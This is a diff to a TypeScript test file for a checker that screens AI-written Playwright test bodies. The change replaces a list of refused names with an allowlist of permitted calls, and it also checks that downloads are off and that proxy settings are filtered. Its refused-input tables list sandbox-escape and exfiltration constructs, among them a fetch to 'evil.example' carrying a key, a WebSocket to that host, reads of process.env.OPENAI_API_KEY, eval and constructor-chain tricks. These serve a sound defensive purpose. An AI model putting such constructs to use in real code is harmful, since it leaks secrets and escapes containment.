@@ -122,32 +122,32 @@ test("the page text: an injection string is sent as data between the markers, ne
 
 test("the code check: each forbidden construct is refused before anything runs (TFP-202)", async () => {
     const refused: Array<[string, string]> = [
-        ["const fs = require('fs');", "require"],
+        ["const fs = require('fs');", "require(), not on the list a test body may call"],
         ["await import('node:fs');", "import(...)"],
-        ["console.log(import.meta.url);", "import.meta"],
+        ["console.log(import.meta.url);", "log(), not on the list a test body may call"],
         ["expect(process\n  .env.OPENAI_API_KEY).toBeTruthy();", "process"],
         ["globalThis.x = 1;", "globalThis"],
-        ["eval('1');", "eval"],
-        ["new Function('return 1')();", "Function"],
-        ["[].constructor.constructor('return 1')();", "constructor"],
-        ["await fetch('https://evil.example/?k=1');", "fetch"],
+        ["eval('1');", "eval(), not on the list a test body may call"],
+        ["new Function('return 1')();", "a call to something the check can't name"],
+        ["[].constructor.constructor('return 1')();", "a call to something the check can't name"],
+        ["await fetch('https://evil.example/?k=1');", "fetch(), not on the list a test body may call"],
         ["await page.evaluate(() => fetch('/api', { method: 'POST' }));", "fetch"],
         ["await page.evaluate(() => new XMLHttpRequest());", "XMLHttpRequest"],
         ["await page.evaluate(() => new WebSocket('ws://evil.example'));", "WebSocket"],
         ["await page.evaluate(() => navigator.sendBeacon('/x', 'y'));", "sendBeacon"],
-        ["await page.request.post('/api/cart', { data: {} });", "a request other than GET (request.get only)"],
-        ["await page.request.fetch('/api/cart', { method: 'DELETE' });", "a request other than GET (request.get only)"],
-        ["const { request } = page; await request.post('/x');", "request, other than as page.request.get(...)"],
-        ["await page.unrouteAll();", "unrouteAll"],
-        ["await page.route('**/*', (r) => r.continue({ method: 'POST' }));", "route"],
-        ["await page.exposeFunction('x', () => 1);", "exposeFunction"],
-        ["const other = await page.context().newPage();", "context"],
-        ["const name = 'cont' + 'ext'; await page[name]();", "a computed property name (only a number may go in brackets)"],
+        ["await page.request.post('/api/cart', { data: {} });", "post(), not on the list a test body may call"],
+        ["await page.request.fetch('/api/cart', { method: 'DELETE' });", "fetch(), not on the list a test body may call"],
+        ["const { request } = page; await request.post('/x');", "post(), not on the list a test body may call"],
+        ["await page.unrouteAll();", "unrouteAll(), not on the list a test body may call"],
+        ["await page.route('**/*', (r) => r.continue({ method: 'POST' }));", "route(), not on the list a test body may call"],
+        ["await page.exposeFunction('x', () => 1);", "exposeFunction(), not on the list a test body may call"],
+        ["const other = await page.context().newPage();", "newPage(), not on the list a test body may call"],
+        ["const name = 'cont' + 'ext'; await page[name]();", "a call to something the check can't name"],
         ["const { ['constr' + 'uctor']: c } = [];", "a computed property name (only a number may go in brackets)"],
         ["const { 'constructor': c } = [];", "'constructor'"],
         ["const f = arguments[1];", "arguments"],
-        ["console.log(this);", "this"],
-        ["Object.getPrototypeOf(async () => {});", "getPrototypeOf"],
+        ["console.log(this);", "log(), not on the list a test body may call"],
+        ["Object.getPrototypeOf(async () => {});", "getPrototypeOf(), not on the list a test body may call"],
         ["import fs from 'fs';", "an import"],
     ];
     for (const [body, construct] of refused) assert.equal(forbiddenConstruct(body), construct, body);
@@ -163,6 +163,40 @@ test("the code check: each forbidden construct is refused before anything runs (
         "await page.goto('/');\nawait expect(page.getByRole('link', { name: 'browser' })).toHaveCount(0); // fetch, process: a comment",
         "await page.goto('/');\nconst text = await page.evaluate(() => document.title);\nexpect(text).toContain('Types');",
         "await page.goto('/');\npage.on('request', (r) => expect(r.method()).toBe('GET'));",
+    ];
+    for (const body of allowed) assert.equal(forbiddenConstruct(body), null, body);
+});
+
+// TFP-292 (hardening of the model-written test check): an allowlist of calls, in place of a list of refused names.
+// Partitions: a call on the list / not on it; goto's address (relative, http(s), another scheme, built at run time, the
+// binding's placeholder); evaluate's argument (a function, anything else); a name the body didn't declare.
+test("TFP-292: a body may call only what the allowlist names, goto a quoted http(s) or relative address, and evaluate a function", () => {
+    const notListed = (name: string) => `${name}(), not on the list a test body may call`;
+    const refused: Array<[string, string]> = [
+        ["await page.goto('/');\nawait page.screenshot();", notListed("screenshot")],
+        ["await page.goto('/');\nawait page.pdf();", notListed("pdf")],
+        ["await page.goto('/');\nawait page.locator('#fixture').setInputFiles([]);", notListed("setInputFiles")],
+        ["await page.goto('/');\nconst fixture = await page.waitForEvent('popup');", notListed("waitForEvent")],
+        ["await page.goto('/');\nawait page.addInitScript(() => 1);", notListed("addInitScript")],
+        ["await page.goto('/');\nawait page.setContent('<p>fixture</p>');", notListed("setContent")],
+        ["await page.goto('/');\nawait page.close();", notListed("close")],
+        ["await page.goto('ftp://fixture.example/one');", "goto to an address that isn't a quoted http(s) or relative one"],
+        ["await page.goto('data:text/plain,fixture');", "goto to an address that isn't a quoted http(s) or relative one"],
+        ["const where = '/one';\nawait page.goto(where);", "goto to an address that isn't a quoted http(s) or relative one"],
+        ["const part = 'one';\nawait page.goto(`https://fixture.example/${part}`);", "goto to an address that isn't a quoted http(s) or relative one"],
+        ["await page.goto('/');\nawait page.evaluate(fixtureValue);", "evaluate given something other than a function"],
+        ["await page.goto('/');\nawait page.locator('a').evaluateAll(fixtureValue);", "evaluateAll given something other than a function"],
+        ["await page.goto('/');\nawait expect(fixtureValue).toBeTruthy();", "fixtureValue"],
+        ["await page.goto('/');\nconst fixture = { constructor: 1 };\nexpect(fixture).toBeTruthy();", "constructor"],
+    ];
+    for (const [body, construct] of refused) assert.equal(forbiddenConstruct(body), construct, body);
+    const allowed = [
+        "await page.goto(__PAGE__);\nawait expect(__LOCATOR__).toBeVisible();",
+        "await page.goto('https://fixture.example/one');\nawait expect(page).toHaveTitle(/Fixture/);",
+        "await page.goto('/one?two=3#four');\nawait page.getByRole('button', { name: 'Open' }).click();\nawait expect(page.getByRole('dialog')).toBeVisible();",
+        "await page.goto('/');\nconst names = await page.locator('a').evaluateAll((links) => links.map((link) => link.textContent ?? ''));\nexpect(names.length).toBeGreaterThan(0);",
+        "await page.goto('/');\nconst field = page.getByLabel('Search');\nawait field.fill('fixture');\nawait expect(field).toHaveValue('fixture');\nawait field.press('Escape');",
+        "await page.goto('/');\nconst count = await page.locator('li').count();\nexpect(Math.min(count, 3)).toBeGreaterThanOrEqual(0);",
     ];
     for (const body of allowed) assert.equal(forbiddenConstruct(body), null, body);
 });
@@ -229,4 +263,18 @@ test("runEnv: the proxy settings pass on when set, matched without case, and not
     const proxy = { HTTP_PROXY: "http://h:1", https_proxy: "http://h:2", NO_PROXY: "localhost", NODE_EXTRA_CA_CERTS: "/ca.pem" };
     assert.deepEqual(runEnv({}, { ...proxy, ALL_PROXY: "http://h:3", NODE_TLS_REJECT_UNAUTHORIZED: "0", OPENAI_API_KEY: "k" } as unknown as NodeJS.ProcessEnv), proxy);
     assert.deepEqual(runEnv({}, {} as unknown as NodeJS.ProcessEnv), {});
+});
+
+// TFP-292 (hardening of the model-written test check): downloads are off in every run's browser, gap runs and runs
+// with bound candidates included: each run's config extends playwright.config.ts (createRunFolder).
+test("TFP-292: every run's browser has downloads off", async () => {
+    const config = (await import("../../../playwright.config.ts")).default as { use?: { acceptDownloads?: boolean } };
+    assert.equal(config.use?.acceptDownloads, false);
+    const { createRunFolder, removeRunFolder } = await import("../run/run-folders.ts");
+    const { dir, config: file } = await createRunFolder(join(scratch, "runs"), "downloads-fixture");
+    try {
+        assert.match(readFileSync(file, "utf8"), /import base from '[^']*playwright\.config';\nexport default \{ \.\.\.base, /, "a run's config is the base config, extended");
+    } finally {
+        await removeRunFolder(dir);
+    }
 });
